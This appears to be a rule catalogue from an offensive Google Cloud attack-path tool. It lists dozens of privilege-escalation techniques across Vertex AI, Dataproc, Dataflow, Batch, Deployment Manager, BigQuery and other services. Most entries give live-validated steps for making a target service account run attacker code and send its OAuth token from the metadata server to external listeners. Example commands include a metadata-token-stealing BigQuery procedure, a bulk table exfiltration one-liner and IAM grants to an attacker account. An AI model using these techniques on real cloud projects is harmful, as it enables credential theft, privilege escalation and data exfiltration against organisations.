Pickle must be built with Python matching the pythonVersion param (mismatch causes 'no locals found when setting up annotations' error)
Vertex AI platform service agent (service-PROJECT_NUMBER@gcp-sa-aiplatform.iam.gserviceaccount.com) needs storage.objects.get on the pickle bucket — grant objectViewer or make bucket public
Pickle can be staged in an external bucket outside the target org

CREATE_VERTEX_NOTEBOOK_RUNTIME_AS_SA.description: Create a Colab Enterprise runtime configured to run as a high-privilege SA. Connect to the runtime and execute code that accesses the GCE metadata endpoint to steal the SA token.

DEPLOY_VERTEX_ENDPOINT_CUSTOM_CONTAINER_.description: Create a Vertex AI Endpoint, register a custom prediction container (Docker image you control) as a Model, and deploy the model to the endpoint with serviceAccount=TARGET_SA. The container runs on Vertex-managed GCE-backed compute with full GCE metadata server access. Container code fires on startup — no prediction call needed to exfil the token.
caveats: actAs IS enforced at deployModel time (HTTP 400 INVALID_ARGUMENT) — unlike Custom Jobs where it is enforced async. Attacker must hold iam.serviceAccounts.actAs on the target SA.
Container image must be in Artifact Registry or GCR — DockerHub images are rejected by Vertex AI

Image CAN be in a completely external org/project (confirmed with cross-org AR repo). The Vertex AI service agent (service-PROJECT_NUM@gcp-sa-aiplatform.iam.gserviceaccount.com) needs roles/artifactregistry.reader on the external repo — allUsers alone is NOT sufficient; explicit SA grant is required
Deployment takes 12-17 minutes (creating GKE serving cluster + pulling image + starting container)
No aiplatform.endpoints.predict required — use startup exfil (background thread on container start) to avoid this permission entirely
UI locations: Agent Platform > Models > Endpoints (endpoint), Agent Platform > Models > Model Registry (model), Agent Platform > Models > Endpoints > [endpoint] > Deployed Models (deployed model)

UPDATE_VERTEX_REASONINGENGINE_AS_SA.description: PATCH an existing Reasoning Engine updating both spec.serviceAccount=TARGET_SA and spec.packageSpec.pickleObjectGcsUri to attacker-controlled pickle in one call. Container reinitializes and calls set_up() as TARGET_SA automatically — no aiplatform.reasoningEngines.query needed. actAs enforced synchronously (HTTP 400 without it).
caveats: Requires an existing Reasoning Engine in the target project — only viable where RE resources are already deployed
PATCH updateMask can include both spec.serviceAccount AND spec.packageSpec — attacker can inject arbitrary pickle code alongside SA swap in one API call
set_up() fires on container reinit after update — no aiplatform.reasoningEngines.query permission needed for token exfil
New pickle must be hosted in GCS readable by the Vertex AI platform service agent (service-PROJECT_NUM@gcp-sa-aiplatform.iam.gserviceaccount.com) — can be external org bucket
actAs enforced synchronously at PATCH time (HTTP 400), not async like RE CREATE path
UI location: Agent Platform > Agents > Deployments

CREATE_VERTEX_TRAININGJOB_AS_SA.description: Create a Vertex AI Training Pipeline with trainingTaskDefinition=custom_task and serviceAccount=TARGET_SA inside trainingTaskInputs. The worker container runs as TARGET_SA and can read the OAuth2 token from the GCE metadata server. Token confirmed via Burp Collaborator callback.
caveats: actAs IS enforced at pipeline submission time (HTTP 400 INVALID_ARGUMENT before pipeline is created).
actAs IS enforced at submission time (HTTP 400 INVALID_ARGUMENT before pipeline is created). Not deferred to execution.
serviceAccount field lives inside trainingTaskInputs (not at the top-level jobSpec like customJobs). Schema: trainingTaskInputs.serviceAccount.

trainingTaskDefinition must be set to a schema URI. For custom containers use: gs://google-cloud-aiplatform/schema/trainingjob/definition/custom_task_1.0.0.yaml — this is a Google-owned public GCS bucket, no storage permissions needed to reference it.
No custom container image required — use any public image (e.g. gcr.io/google.com/cloudsdktool/cloud-sdk:slim) and override containerSpec.command + args inline.
Egress to attacker-controlled URLs confirmed from Vertex AI training worker nodes via live test.
Vertex AI service agent must have roles/iam.serviceAccountTokenCreator on TARGET_SA (auto-granted when Vertex AI API is enabled).

CREATE_VERTEX_KFP_JOB_AS_SA.description: Submit a Vertex AI Pipeline job that runs its steps as the target SA, enabling container-level code execution to steal the SA's access token from metadata.
caveats: actAs IS enforced at submission time (HTTP 400 INVALID_ARGUMENT before job is created). Not deferred to execution.

TARGET SA must have aiplatform.metadataStores.get in the SAME project as the pipeline job. This is a project-level Vertex AI metadata permission checked during pipeline execution initialization. Without it, the job starts but fails immediately.

runtimeConfig.gcsOutputDirectory must point to a real GCS bucket. The bucket can be in ANY project (attacker-controlled is fine). TARGET SA needs storage.objects.get + storage.objects.create on that bucket, which can be granted in a different project.
Pipeline spec can be fully inline in the REST body (deploymentSpec.executors structure) — no kfp SDK, no GCS-hosted spec required.
Egress to attacker-controlled URLs confirmed from KFP pipeline step containers via live test.
Vertex AI service agent must have roles/iam.serviceAccountTokenCreator on TARGET_SA (auto-granted when Vertex AI API is enabled).

CREATE_WORKBENCH_INSTANCE_AS_SA.description: Create a Vertex AI Workbench instance bound to the target SA, using the JupyterLab environment to execute arbitrary notebooks that steal the SA's GCP credentials.

CREATE_NOTEBOOKS_EXECUTION_AS_SA.description: Submit a Notebooks Execution job (notebookExecutionJob) that runs a Jupyter notebook as the target SA on Vertex AI Custom Training infrastructure. Notebook cells can query the GCE metadata server to retrieve TARGET_SA's OAuth2 access token. End-to-end token recovery confirmed.
caveats: API uses the Vertex AI aiplatform.googleapis.com endpoint, NOT notebooks.googleapis.com v2 — correct path is v1/projects/.../notebookExecutionJobs
Prerequisite: service-{PROJECT_NUM}@gcp-sa-notebooks.iam.gserviceaccount.com must have roles/notebooks.serviceAgent at project level — not auto-granted even when the Notebooks API is enabled
Token recovery: GCS output notebook contains the printed token; scan_log_markers can also find markers in Cloud Logging

CREATE_DATAPROC_CLUSTER_AS_SA.description: Create a Dataproc cluster with a target SA as the node service account. An initialization-actions script staged in GCS runs automatically during provisioning as TARGET_SA, allowing exfiltration of TARGET_SA's OAuth2 token from the GCE metadata server. No job submission needed — the init script fires before Spark/Hadoop services start.
CREATE_DATAPROC_CLUSTER_AS_SA.caveats: Dataproc downloads the init script as the NODE SA (TARGET_SA), so TARGET_SA needs storage.objects.get on the init script location. Use a public bucket or grant TARGET_SA read on the init script bucket. Also: HDB_TOTAL_GB quota in a region may limit disk size; use --master-boot-disk-size=50GB and --single-node if needed.

target_sa_minimum_permissions.note: TARGET_SA must have these permissions for the Dataproc node agent + Dataproc staging bucket access. Validated via live testing. Note: Dataproc also downloads the init script as TARGET_SA, so TARGET_SA needs read on the init script GCS object.

CREATE_DATAPROC_BATCH_AS_SA.description: Submit a Dataproc Serverless batch workload bound to the target SA, executing arbitrary PySpark/Spark code that can steal the SA's GCP credentials from the metadata server.

target_sa_minimum_permissions.note: Minimum permissions for TARGET_SA to run a Dataproc Serverless batch. Validated via iterative live testing: each permission removed individually, confirmed either via GCP preflight rejection or fresh-VM timeout failure. storage.objects.create is required by the GCP preflight validator even when exfil uses anonymous GCS writes.

CREATE_DATAPROC_WORKFLOW_TEMPLATE_AS_SA.description: Create and instantiate a Dataproc Workflow Template that runs as the target SA, executing arbitrary Hadoop/Spark jobs to steal the SA's credentials from the metadata server.

target_sa_minimum_permissions.note: Minimum permissions for TARGET_SA to run a Dataproc cluster via workflow template. GCP preflight validates all 13 permissions before provisioning. Cluster nodes obtain OAuth tokens via the standard GCE metadata server (no dataprocrm.nodes.mintOAuthToken required, unlike serverless). Storage perms apply to the auto-created dataproc-staging-* and dataproc-temp-* buckets.

CREATE_DATAFLOW_JOB_AS_SA.description: Submit a Dataflow batch or streaming job with serviceAccountEmail=TARGET_SA. Dataflow spins up GCE worker VMs running as the target SA. User-supplied pipeline code queries the GCE IMDS (http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token) to steal the SA's access token and exfil via HTTP. Confirmed live: HTTP GET received at Burp Collaborator from GCE worker with full ya29 token for target SA.

CREATE_DATAFLOW_DATAPIPELINE_AS_SA.description: Create a Cloud Data Pipelines workflow bound to the target SA, using it to launch Dataflow jobs that execute as the SA and exfiltrate credentials.

CREATE_BQ_SPARK_PROCEDURE_AS_SA.description: Create a BigQuery Spark connection with an auto-managed service account, then run a Spark stored procedure that executes arbitrary Python code as that SA, exfiltrating credentials from the GCE metadata endpoint.

DELEGATE_BQ_CONNECTION_AS_SA.description: Use a BigQuery Spark connection that has been configured with a high-privilege service account (connection SA granted elevated IAM permissions by an admin). Create a Spark stored procedure using the connection → Spark job runs as the connection SA. No iam.serviceAccounts.actAs required.
DELEGATE_BQ_CONNECTION_AS_SA.example_command: bq query --nouse_legacy_sql "CREATE OR REPLACE PROCEDURE PE_DATASET.EXFIL_PROC() WITH CONNECTION \`PROJECT.REGION.CONNECTION_ID\` OPTIONS(engine='SPARK') LANGUAGE PYTHON AS ''' import requests; print(requests.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", headers={"Metadata-Flavor":"Google"}).text) '''; CALL PE_DATASET.EXFIL_PROC();"

CREATE_DATAFUSION_INSTANCE_AS_SA.description: Create a Cloud Data Fusion instance bound to the target SA (as its Dataproc service account), deploying ETL pipelines that run on Dataproc clusters with the SA's identity.

CREATE_DATAPLEX_LAKE_TASK_AS_SA.description: Create a Dataplex lake, then create and run an ON_DEMAND Dataplex Spark task bound to the target SA. Dataplex executes the task on Dataproc Serverless; the Python script queries GCE IMDS and exfils the SA token. The target SA must hold roles/dataproc.worker (required by Dataproc Serverless). actAs is enforced at task create time via executionSpec.serviceAccount. GCS (googleapis.com) is reachable via Private Google Access from inside the Dataproc Serverless container even when outbound internet TCP is blocked.

CREATE_DATAPLEX_TASK_AS_SA.description: Create and run an ON_DEMAND Dataplex Spark task bound to the target SA against a pre-existing lake. Dataplex executes the task on Dataproc Serverless; the Python script queries GCE IMDS and exfils the SA token. The target SA must hold roles/dataproc.worker. actAs is enforced at task create time via executionSpec.serviceAccount. GCS (googleapis.com) is reachable via Private Google Access. Requires a pre-existing Dataplex lake in the target project (use CREATE_DATAPLEX_LAKE_TASK_AS_SA when no lake exists).

requires_enumerated.description: A Dataplex lake must already exist in the target project

CREATE_BATCH_JOB_AS_SA.description: Submit a Cloud Batch job with allocationPolicy.serviceAccount=TARGET_SA. The job's VM workers boot as TARGET_SA with GCE IMDS access, exposing the SA's live OAuth2 token. Startup script exfils token to Burp Collaborator or GCS.
caveats: serviceAccount goes in allocationPolicy.serviceAccount, NOT in taskGroups[].taskSpec

The project's Cloud Services SA (PROJECT_NUMBER@cloudservices.gserviceaccount.com) must have roles/iam.serviceAccountUser on the target SA — this is required for Compute Engine to attach the SA to the VM. In most real environments this SA has Editor/Owner or was explicitly granted actAs when the SA was first used with Compute Engine.

Target SA must have batch.states.report (roles/batch.agentReporter) so the VM's Batch agent can report task status back to the Batch API. Without it the VM boots but the agent times out after 1080s and the job fails.
Cloud Logging (logsPolicy.destination=CLOUD_LOGGING) may require logging.logEntries.create on the target SA — omit logsPolicy or set destination=PATH to avoid this dependency.

target_sa_minimum_permissions.note: Minimum permissions for TARGET_SA confirmed via live testing. The Batch VM agent runs as the target SA and needs batch.states.report to report task status. The Cloud Services SA actAs binding is an environment prerequisite, not a target SA permission.

CREATE_CLOUDWORKFLOWS_EXECUTION_AS_SA.description: Create a Cloud Workflow bound to the target SA and execute it. The workflow makes arbitrary googleapis.com REST calls authenticated as the target SA (OAuth2). Unlike token-exfil edges, the attack value is side-effect mutations (IAM changes, SA key upload) or identity confirmation via the execution result; raw token exfil to external URLs is not possible since Cloud Workflows restricts OAuth2 auth to *.googleapis.com domains only.
caveats: Cloud Workflows restricts auth:OAuth2 to *.googleapis.com domains — cannot exfil raw Bearer token to external listeners
auth:OIDC works for any URL (Cloud Run, Cloud Functions, external) but delivers an identity JWT, not an OAuth2 access token
No GCE metadata server — Cloud Workflows is serverless; token cannot be read directly from YAML
Environment prereq: Workflows service agent (service-PROJECT_NUMBER@gcp-sa-workflows.iam.gserviceaccount.com) must have roles/iam.serviceAccountUser on the target SA

CREATE_TPU_NODE_AS_SA.description: Create a Cloud TPU node bound to the target SA. The TPU host VM runs as the target SA with GCE IMDS access; a startup-script exfils the OAuth2 token via HTTP POST.
caveats: v2-8 TPU nodes have no available hardware capacity in any zone as of 2026-10; use v5litepod-1 (default) in us-east1-c instead
v5litepod-1 requires the v2alpha1 API (the module handles this automatically based on accelerator type)
VM must have enableExternalIps=true OR Cloud NAT configured for the startup-script HTTP exfil to reach external URLs
Target SA needs zero permissions; the TPU VM boots as the SA regardless

CREATE_WORKSTATION_AS_SA.description: Create a WorkstationCluster, then a WorkstationConfig with host.gceInstance.serviceAccount=TARGET_SA and a startupScriptUri pointing to an exfil script, create a Workstation from it, then start it. The workstation VM boots as TARGET_SA with GCE IMDS access; the startup script exfils the OAuth2 token.
caveats: workstations.workstationClusters.create required if no cluster exists in the target region; cluster provisioning takes 10-20 min
startupScriptUri (v1beta API field) must reference a publicly readable GCS object; use https://workstations.googleapis.com/v1beta/... endpoint
actAs enforced at WorkstationConfig creation time
workstations.workstations.start required to boot the VM and trigger the startup script

CREATE_CLOUDDEPLOY_RELEASE_AS_SA.description: Create a Cloud Deploy delivery pipeline with strategy.standard.predeploy.actions=["exfil"], a target with executionConfigs.serviceAccount=TARGET_SA and PREDEPLOY in executionConfigs.usages, a release sourced from a GCS tarball containing a skaffold.yaml with a customActions block, and a rollout. Cloud Deploy runs the predeploy customAction as a Cloud Build container using the target SA; the container queries GCE IMDS and exfils the SA token. actAs is enforced at target CREATE time. Cloud Deploy service agent (service-PROJECT_NUMBER@gcp-sa-clouddeploy.iam.gserviceaccount.com) needs roles/iam.serviceAccountUser on TARGET_SA; TARGET_SA needs roles/clouddeploy.jobRunner.

CREATE_DEPLOYMENTMANAGER_DEPLOYMENT_AS_S.description: Create a Deployment Manager deployment that provisions a Compute VM assigned to the target SA. A startup script queries IMDS and exfils the SA token. actAs is enforced via the Google APIs Service Agent (PROJECT_NUMBER@cloudservices.gserviceaccount.com) which carries roles/clouddeploymentmanager.serviceAgent including iam.serviceAccounts.actAs project-wide — this hidden system grant means the attacker does not need to hold actAs themselves.
caveats: Caller does NOT need iam.serviceAccounts.actAs — the Google APIs Service Agent holds implicit project-wide actAs via a hidden system binding (roles/clouddeploymentmanager.serviceAgent) not visible in getIamPolicy.
This edge fires in any project where Deployment Manager is enabled, regardless of per-SA resource policies.
Target SA token is minted by GCE IMDS regardless of the SA's own IAM permissions — even a zero-permission SA yields a valid token.

CREATE_INFRA_MANAGER_DEPLOYMENT_AS_SA.description: Infrastructure Manager (config.googleapis.com) deployment with serviceAccount=TARGET_SA executes Terraform in a Google-managed Cloud Build container. The GCE metadata server inside the container serves tokens for TARGET_SA. actAs is enforced via the IM service agent (service-{NUM}@gcp-sa-config.iam.gserviceaccount.com) which carries roles/cloudconfig.serviceAgent including iam.serviceAccounts.actAs project-wide — the attacker does not need to hold actAs themselves.
caveats: Caller does NOT need iam.serviceAccounts.actAs — the IM service agent holds roles/cloudconfig.serviceAgent which includes project-wide actAs by default (auto-granted when config.googleapis.com is enabled).

Target SA needs roles/config.agent at project level — the IM state backend sidecar calls config state APIs as the target SA during tf-init. Without this, deployment fails at tf-init with 'Error refreshing state: Failed to get state' 403.
Target SA needs roles/storage.admin on the artifacts GCS bucket for Terraform state and artifacts.
Attacker needs a GCS bucket to upload malicious Terraform (--gcs-source). Files must be readable by the IM service agent.
Use the full resource name for serviceAccount: 'projects/{PROJECT}/serviceAccounts/{EMAIL}'
Build takes ~3-5 minutes from deployment creation to local-exec execution.
Do NOT specify workerPool in the deployment body — the default is fine; specifying one causes REVISION_FAILED.
External HTTPS IS reachable from Infra Manager Terraform workers (confirmed).
Target SA token is minted by Cloud Build IMDS regardless of the SA's own IAM permissions — even a zero-permission SA yields a valid token.

CREATE_APP_INTEGRATION_AS_SA.description: Create an Application Integration workflow bound to the target SA, using REST Task steps to exfiltrate the SA's OAuth token to a callback URL.

CALL_API_AS_SA_VIA_INTEGRATION.description: Create, deploy, and invoke an Application Integration workflow configured with the target SA for HTTP task authentication. The integration can call any googleapis.com REST endpoint authenticated as the target SA — including setIamPolicy, generating tokens, or calling storage/BigQuery APIs. Similar to CREATE_CLOUDSCHEDULER_JOB_AS_SA but using the Application Integration runtime. Does not return the raw OAuth2 token; use to confirm identity or make privileged API calls on behalf of the target SA.
CALL_API_AS_SA_VIA_INTEGRATION.example_command: gcloud integrations execute pwn-integration --location us-central1 --project PROJECT_ID
caveats: Prerequisite: the Application Integration service agent must have roles/iam.serviceAccountTokenCreator on the target SA (granted via iam.serviceAccounts.setIamPolicy).

requires.note: Required to grant INT_AGENT tokenCreator on TARGET_SA, unless INT_AGENT already has tokenCreator from prior App Integration use

EXECUTE_APP_INTEGRATION_AS_SA.description: Create an Application Integration version with runAsServiceAccount=TARGET_SA. Use GenericRestV2Task with URL pointing to attacker-controlled endpoint. When executed, the integration service agent (service-PROJECT_NUM@gcp-sa-integrations.iam.gserviceaccount.com) generates an OAuth2 token for TARGET_SA and automatically attaches it as 'Authorization: Bearer ya29.<ACCESS_TOKEN> to the outbound HTTP request. Note: actAs is NOT enforced at publish time — only at execute time, against the integration service agent (not the caller). If the integration service agent lacks tokenCreator on the target SA, execution fails with PERMISSION_DENIED.
EXECUTE_APP_INTEGRATION_AS_SA.example_command: # Create integration version with runAsServiceAccount=TARGET_SA and GenericRestV2Task pointing to attacker URL, then POST to :execute endpoint

CREATE_APIGATEWAY_OIDC_AS_SA.description: Create an API Gateway API, config, and gateway backed by a Cloud Run or backend URL configured to issue OIDC tokens signed as the target SA. The OIDC token is exchanged for an OAuth access token via Workload Identity Federation or used directly.

CREATE_RESOURCE_VIA_FLEET_GATEWAY.description: POST requests (create K8s resources) through the GKE Connect Gateway require gkehub.gateway.post at the GCP IAM layer. Without it the gateway returns 'Error from server (Forbidden): unknown (post pods)'. With it, POST is forwarded to K8s and the normal K8s RBAC rules apply. Combine with container.pods.create GCP IAM and K8s RBAC to create pods and steal SA tokens.

MODIFY_FLEET_CLUSTER_RESOURCE_PUT.description: PUT (create/replace) any K8s resource on a fleet-enrolled cluster through the GKE Connect Gateway. Callers with K8s RBAC create permissions can deploy pods bound to privileged SAs, create ClusterRoleBindings, or replace running workloads to insert malicious containers. The PUT is forwarded through the Connect Gateway and only requires the GCP IAM gkehub.gateway.put permission plus appropriate K8s RBAC. Live-validated.

MODIFY_FLEET_CLUSTER_RESOURCE_PATCH.description: PATCH (merge/strategic-merge) any existing K8s resource on a fleet-enrolled cluster through the GKE Connect Gateway. Can patch running pods (add containers, modify env vars, mount secret volumes), patch ConfigMaps to inject malicious data, or patch ServiceAccounts to add WIF annotations. Live-validated.

CAN_MODIFY_BUCKET_IAM.dead_end_note: A GCS bucket is a data store with no attached SA that executes code. There is no mechanism to get an SA OAuth token from a bucket's IAM policy — no runtime, no metadata endpoint, no code to inject. setIamPolicy grants data plane access (read/write objects) only. If the bucket contains an SA key file or other credentials, that is a data-at-rest secret access path, not an SA token.
CAN_MODIFY_BUCKET_IAM.description: Modify a GCS bucket's IAM policy to grant storage.objects.get/create, enabling data exfiltration or write-based lateral movement. Resource access only — does not yield an SA token.
CAN_MODIFY_BUCKET_IAM.example_command: modules run exploit_gcp_setiampolicy --service bucket --member user:ATTACKER@example.com --role roles/storage.objectAdmin

CAN_MODIFY_KMS_CRYPTOKEY_IAM.dead_end_note: A Cloud KMS key is a cryptographic primitive with no attached SA that executes code. There is no mechanism to get an SA OAuth token from a KMS key's IAM policy — no runtime, no metadata endpoint, no code to inject. setIamPolicy grants cryptographic operations (encrypt/decrypt/sign) on that key only. If the key protects data that itself contains credentials, decrypting it is a separate data access path, not an SA token.
CAN_MODIFY_KMS_CRYPTOKEY_IAM.description: Modify a Cloud KMS key's IAM policy to grant cloudkms.cryptoKeyDecrypter, enabling decryption of ciphertext protected by that key. Resource access only — does not yield an SA token.
CAN_MODIFY_KMS_CRYPTOKEY_IAM.example_command: modules run exploit_gcp_setiampolicy --service kmskey --member user:ATTACKER@example.com --role roles/cloudkms.cryptoKeyDecrypter

CREATE_APIGEE_PROXY_AS_SA.description: Deploy an Apigee API proxy with ?serviceAccount=TARGET_SA query parameter. The proxy's runtime identity becomes TARGET_SA, meaning all outbound API calls from the proxy run as TARGET_SA. Schema-confirmed: Apigee discovery doc lists serviceAccount as a query parameter for revisions.deploy with description 'determines what permissions it has'. Needs Apigee org for live confirmation.
caveats: Requires an Apigee organization in the project (not enabled by default; separate billing)
Cannot confirm actAs enforcement without live test. The serviceAccount query param is documented but may require actAs like other Apigee IAM checks
If confirmed, proxy outbound HTTP calls use TARGET_SA OIDC/OAuth2 token — attacker controls proxy logic, so arbitrary GCP API calls are possible

EXPORT_BQ_TABLE_TO_GCS.description: Export a full BigQuery table to a Cloud Storage bucket. Attacker can dump entire tables to a GCS bucket they control, enabling bulk data exfiltration that bypasses per-query row limits.

BQ_STORAGE_READ_API_EXFIL.description: Create a BigQuery Storage Read API session to stream full table data at high throughput. Bypasses standard query quota limits; designed for bulk data access. Enables efficient mass exfiltration of BQ table contents.
BQ_STORAGE_READ_API_EXFIL.example_command: python3 -c "from google.cloud.bigquery_storage import BigQueryReadClient; client = BigQueryReadClient(); session = client.create_read_session(parent='projects/PROJECT', read_session={'table':'projects/PROJECT/datasets/DATASET/tables/TABLE', 'data_format': 1}, max_stream_count=1); print(session)"

DECRYPT_WITH_KMS_KEY.description: Use a KMS CryptoKey version to decrypt ciphertext; decrypt any data encrypted with this key including stored secrets, SA key material, database passwords, configuration data protected by envelope encryption. High-impact for orgs using CMEK.

SIGN_WITH_KMS_KEY.description: Use an asymmetric KMS signing key to sign arbitrary data; if the key is used as a SAML IdP signing key, JWT signing key, or code signing key, enables SAML assertion forgery, JWT token forgery, or binary signing.

CONNECT_TO_CLOUD_SQL_DB.description: Establish a connection to a Cloud SQL instance via Cloud SQL Proxy or Direct Connect; combined with database credentials (from app configs or secrets), provides direct SQL query access to all databases; sensitive_resource_access.

CREATE_CLOUDSQL_SSL_CERT.description: Create an SSL certificate for a Cloud SQL instance. The API response includes the certPrivateKey (RSA private key in PEM format) which is a long-lived credential valid for client certificate authentication to the Cloud SQL instance. The private key is only returned at creation time. Live-validated: HTTP 200 response included a full RSA private key.
CREATE_CLOUDSQL_SSL_CERT.example_command: POST https://sqladmin.googleapis.com/v1/projects/PROJECT/instances/INSTANCE/sslCerts -d '{"commonName": "attacker"}'  # response.certPrivateKey contains the RSA private key

READ_DEVELOPERCONNECT_GIT_READ_TOKEN.description: Fetch a short-lived read-only OAuth access token for a git repository linked in Developer Connect. The token can be used to clone the repository or read its content without having GitHub/GitLab credentials directly. Live-validated: HTTP 404 NOT_FOUND (not 403) confirms permission check passed.

READ_DEVELOPERCONNECT_GIT_TOKEN.description: Fetch a read/write OAuth token for a connected git repository (GitHub, GitLab, Bitbucket). Exposes credentials sufficient for full source code read/write access. Supply chain attack vector.

READ_WORKSTATION_ACCESS_TOKEN.description: Generate a short-lived JWT access token for connecting to a Cloud Workstation. The token authenticates to the workstation's HTTPS/SSH endpoint and grants interactive access to the running workstation VM, which runs as the workstation's configured SA. Token retrieval confirmed via HTTP 200 with full JWT in accessToken field. Live-validated.
READ_WORKSTATION_ACCESS_TOKEN.example_command: POST https://workstations.googleapis.com/v1/projects/PROJECT/locations/REGION/workstationClusters/CLUSTER/workstationConfigs/CONFIG/workstations/WS:generateAccessToken -d '{"ttl": "3600s"}'  # response.accessToken = JWT for workstation access

CAN_READ_SECRET_DATA.description: Read the payload of a Secret Manager secret version — may contain API keys, service account keys, passwords, or other high-value credentials.

READ_API_KEY_STRING.description: Retrieve the actual secret API key string for an existing API key. API keys can authenticate to Google APIs (Maps, Translation, Places, Firebase, etc.) without IAM credentials.

CAN_READ_STORAGE_OBJECT.description: Read objects from a Cloud Storage bucket. May expose credentials, private keys, source code, data exports, or application secrets stored as blobs.

roles/owner.description: Collapsed dangerous-path edge for owner role grants (roles/owner). This edge collapses all matched dangerous rule edges for the same grant->target path. See dangerous_rule_names and dangerous_rule_descriptions on the edge for the individual rules that were collapsed.

roles/editor.description: Collapsed dangerous-path edge for editor role grants (roles/editor). This edge collapses all matched dangerous rule edges for the same grant->target path. See dangerous_rule_names and dangerous_rule_descriptions on the edge for the individual rules that were collapsed.
